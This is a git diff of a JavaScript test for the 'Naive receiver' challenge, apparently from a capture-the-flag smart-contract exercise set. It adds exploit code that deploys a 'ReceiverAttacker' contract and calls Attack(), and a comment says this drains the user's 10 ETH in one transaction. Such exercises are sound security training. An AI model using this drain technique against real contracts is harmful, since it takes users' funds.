@@ -30,7 +30,11 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+        // 一次 transaction 領完 user 的 10 ETH
+        const attackerFactory = await ethers.getContractFactory('ReceiverAttacker', attacker);
+        attacker = await attackerFactory.deploy(this.pool.address, this.receiver.address);
+        await attacker.Attack();
     });
 
     after(async function () {
